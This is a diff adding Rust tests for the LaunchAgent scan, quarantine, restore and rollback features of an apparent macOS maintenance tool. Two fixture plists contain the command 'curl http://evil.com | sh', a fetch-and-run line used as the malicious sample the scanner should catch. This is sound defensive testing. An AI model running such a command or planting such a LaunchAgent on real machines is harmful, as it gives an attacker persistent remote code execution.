@@ -324,3 +324,408 @@ fn test_protect_no_destructive_action_plan_actions() -> Result<()> {
 
     Ok(())
 }
+
+#[test]
+fn test_protect_quarantine_dry_run_creates_no_files() -> Result<()> {
+    let env = TestEnv::new("quarantine_dry_run");
+    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.example.bad</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/sh</string>
+        <string>-c</string>
+        <string>curl http://evil.com | sh</string>
+    </array>
+</dict>
+</plist>"#;
+    env.write_plist(&env.user_agents, "com.example.bad.plist", plist);
+    let ctx = env.ctx();
+
+    // 1. Scan to find the finding ID
+    let scan_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Scan,
+        },
+    )?;
+    let findings = scan_res
+        .payload
+        .get("findings")
+        .unwrap()
+        .as_array()
+        .unwrap();
+    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();
+
+    // 2. Run quarantine in dry-run
+    let quar_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Quarantine { id: finding_id },
+        },
+    )?;
+
+    assert_eq!(
+        quar_res.payload.get("execution").unwrap().as_str().unwrap(),
+        "not_executed"
+    );
+    assert!(!ctx.paths.data_dir.join("quarantined_files").exists());
+    assert!(!ctx.paths.audit_file.exists());
+    assert!(!ctx.paths.rollback_file.exists());
+
+    Ok(())
+}
+
+#[test]
+fn test_protect_quarantine_apply_and_restore() -> Result<()> {
+    let env = TestEnv::new("quarantine_apply");
+    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.example.bad</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/sh</string>
+        <string>-c</string>
+        <string>curl http://evil.com | sh</string>
+    </array>
+</dict>
+</plist>"#;
+    let plist_path = env.user_agents.join("com.example.bad.plist");
+    env.write_plist(&env.user_agents, "com.example.bad.plist", plist);
+
+    let mut ctx = env.ctx();
+    ctx.mode = ExecutionMode::Apply;
+
+    // 1. Scan to get ID
+    let scan_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Scan,
+        },
+    )?;
+    let findings = scan_res
+        .payload
+        .get("findings")
+        .unwrap()
+        .as_array()
+        .unwrap();
+    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();
+
+    // 2. Quarantine it
+    let quar_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Quarantine {
+                id: finding_id.clone(),
+            },
+        },
+    )?;
+
+    assert_eq!(
+        quar_res.payload.get("execution").unwrap().as_str().unwrap(),
+        "executed"
+    );
+    assert!(!plist_path.exists());
+
+    let quarantine_dir = ctx.paths.data_dir.join("quarantined_files");
+    assert!(quarantine_dir.exists());
+
+    // 3. Find sidecar metadata to get quarantine_id
+    let mut quarantine_id = String::new();
+    for entry in fs::read_dir(&quarantine_dir)?.flatten() {
+        if entry.path().extension().and_then(|e| e.to_str()) == Some("json") {
+            let content = fs::read_to_string(entry.path())?;
+            let v: serde_json::Value = serde_json::from_str(&content)?;
+            quarantine_id = v["quarantine_id"].as_str().unwrap().to_string();
+        }
+    }
+    assert!(!quarantine_id.is_empty());
+
+    // 4. Restore it
+    let restore_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore { id: quarantine_id },
+        },
+    )?;
+    assert_eq!(
+        restore_res
+            .payload
+            .get("execution")
+            .unwrap()
+            .as_str()
+            .unwrap(),
+        "executed"
+    );
+    assert!(plist_path.exists());
+
+    Ok(())
+}
+
+#[test]
+fn test_restore_unknown_id_fails_cleanly() -> Result<()> {
+    let env = TestEnv::new("restore_unknown");
+    let mut ctx = env.ctx();
+    ctx.mode = ExecutionMode::Apply;
+
+    // Directory doesn't exist yet
+    let res1 = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore {
+                id: "nonexistent".to_string(),
+            },
+        },
+    );
+    assert!(res1.is_err());
+    assert!(res1
+        .unwrap_err()
+        .to_string()
+        .contains("Quarantine directory does not exist"));
+
+    // Directory exists but empty
+    fs::create_dir_all(ctx.paths.data_dir.join("quarantined_files"))?;
+    let res2 = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore {
+                id: "nonexistent".to_string(),
+            },
+        },
+    );
+    assert!(res2.is_err());
+    assert!(res2
+        .unwrap_err()
+        .to_string()
+        .contains("Quarantine record not found"));
+
+    Ok(())
+}
+
+#[test]
+fn test_restore_ambiguity_fails() -> Result<()> {
+    let env = TestEnv::new("restore_ambiguity");
+    let mut ctx = env.ctx();
+    ctx.mode = ExecutionMode::Apply;
+
+    fs::create_dir_all(&ctx.paths.data_dir)?;
+    let qdir = fs::canonicalize(&ctx.paths.data_dir)
+        .unwrap()
+        .join("quarantined_files");
+    fs::create_dir_all(&qdir)?;
+    let canon_qdir = fs::canonicalize(&qdir)?;
+
+    let canon_user_agents = fs::canonicalize(&env.user_agents)?;
+
+    // We must write dummy plist files to the quarantine dir so they can be canonicalized
+    fs::write(canon_qdir.join("one__hash.plist"), b"")?;
+    fs::write(canon_qdir.join("two__hash.plist"), b"")?;
+
+    // Create duplicate sidecars with same quarantine_id
+    let meta = protect::QuarantineMetadata {
+        quarantine_id: "dup_quar_id".to_string(),
+        finding_id: "fid_1".to_string(),
+        original_path: canon_user_agents.join("one.plist"),
+        quarantine_path: canon_qdir.join("one__hash.plist"),
+        metadata_path: canon_qdir.join("one__hash.json"),
+        operation: "protect_quarantine".to_string(),
+        created_at: 100,
+    };
+    fs::write(
+        canon_qdir.join("one__hash.json"),
+        serde_json::to_string(&meta)?,
+    )?;
+
+    let meta2 = protect::QuarantineMetadata {
+        quarantine_id: "dup_quar_id".to_string(),
+        finding_id: "fid_2".to_string(),
+        original_path: canon_user_agents.join("two.plist"),
+        quarantine_path: canon_qdir.join("two__hash.plist"),
+        metadata_path: canon_qdir.join("two__hash.json"),
+        operation: "protect_quarantine".to_string(),
+        created_at: 200,
+    };
+    fs::write(
+        canon_qdir.join("two__hash.json"),
+        serde_json::to_string(&meta2)?,
+    )?;
+
+    // Perform restore -> should fail on ambiguity
+    let res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore {
+                id: "dup_quar_id".to_string(),
+            },
+        },
+    );
+    assert!(res.is_err());
+    assert!(res
+        .unwrap_err()
+        .to_string()
+        .contains("Ambiguous restore query"));
+
+    Ok(())
+}
+
+#[test]
+fn test_sidecar_validation_failures() -> Result<()> {
+    let env = TestEnv::new("sidecar_val");
+    let mut ctx = env.ctx();
+    ctx.mode = ExecutionMode::Apply;
+
+    fs::create_dir_all(&ctx.paths.data_dir)?;
+    let qdir = fs::canonicalize(&ctx.paths.data_dir)
+        .unwrap()
+        .join("quarantined_files");
+    fs::create_dir_all(&qdir)?;
+    let canon_qdir = fs::canonicalize(&qdir)?;
+
+    let canon_user_agents = fs::canonicalize(&env.user_agents)?;
+    let canon_base = fs::canonicalize(&env._base)?;
+
+    // Create dummy files for canonicalization
+    fs::write(canon_base.join("one.plist"), b"")?;
+    fs::write(canon_qdir.join("two__hash.plist"), b"")?;
+
+    // 1. quarantine_path outside quarantine dir
+    let meta1 = protect::QuarantineMetadata {
+        quarantine_id: "qid1".to_string(),
+        finding_id: "fid1".to_string(),
+        original_path: canon_user_agents.join("one.plist"),
+        quarantine_path: canon_base.join("one.plist"), // outside
+        metadata_path: canon_qdir.join("one.json"),
+        operation: "protect_quarantine".to_string(),
+        created_at: 100,
+    };
+    fs::write(canon_qdir.join("one.json"), serde_json::to_string(&meta1)?)?;
+
+    let res1 = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore {
+                id: "qid1".to_string(),
+            },
+        },
+    );
+    assert!(res1.is_err());
+    assert!(res1
+        .unwrap_err()
+        .to_string()
+        .contains("quarantine path outside quarantine directory"));
+
+    fs::remove_file(canon_qdir.join("one.json"))?;
+
+    // 2. original_path outside allowed dir
+    let meta2 = protect::QuarantineMetadata {
+        quarantine_id: "qid2".to_string(),
+        finding_id: "fid2".to_string(),
+        original_path: canon_base.join("one.plist"), // outside ~/Library/LaunchAgents
+        quarantine_path: canon_qdir.join("two__hash.plist"),
+        metadata_path: canon_qdir.join("two.json"),
+        operation: "protect_quarantine".to_string(),
+        created_at: 100,
+    };
+    fs::write(canon_qdir.join("two.json"), serde_json::to_string(&meta2)?)?;
+
+    let res2 = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Restore {
+                id: "qid2".to_string(),
+            },
+        },
+    );
+    assert!(res2.is_err());
+    assert!(res2
+        .unwrap_err()
+        .to_string()
+        .contains("original path outside user LaunchAgents"));
+
+    Ok(())
+}
+
+#[test]
+fn test_protect_quarantine_rollback() -> Result<()> {
+    let env = TestEnv::new("quarantine_rollback");
+    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.example.roll</string>
+    <key>Program</key>
+    <string>/nonexistent/path</string>
+</dict>
+</plist>"#;
+    let plist_path = env.user_agents.join("com.example.roll.plist");
+    env.write_plist(&env.user_agents, "com.example.roll.plist", plist);
+
+    let mut ctx = env.ctx();
+    ctx.mode = ExecutionMode::Apply;
+
+    // Scan to get ID
+    let scan_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Scan,
+        },
+    )?;
+    let findings = scan_res
+        .payload
+        .get("findings")
+        .unwrap()
+        .as_array()
+        .unwrap();
+    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();
+
+    // Quarantine it
+    let quar_res = protect::run(
+        &ctx,
+        macmop::cli::ProtectArgs {
+            command: macmop::cli::ProtectCommand::Quarantine { id: finding_id },
+        },
+    )?;
+    assert!(!plist_path.exists());
+
+    let rollback_id = quar_res
+        .payload
+        .get("rollback_id")
+        .unwrap()
+        .as_str()
+        .unwrap()
+        .to_string();
+
+    // Perform rollback
+    let roll_res = macmop::modules::rollback::run(
+        &ctx,
+        macmop::cli::RollbackArgs {
+            command: macmop::cli::RollbackCommand::Apply {
+                id: rollback_id.clone(),
+            },
+        },
+    )?;
+    assert!(roll_res.payload.get("applied").unwrap().as_bool().unwrap());
+    assert!(plist_path.exists());
+
+    // Second rollback fails cleanly
+    let roll_res2 = macmop::modules::rollback::run(
+        &ctx,
+        macmop::cli::RollbackArgs {
+            command: macmop::cli::RollbackCommand::Apply { id: rollback_id },
+        },
+    );
+    assert!(roll_res2.is_err());
+    assert!(roll_res2
+        .unwrap_err()
+        .to_string()
+        .contains("rollback id not found"));
+
+    Ok(())
+}
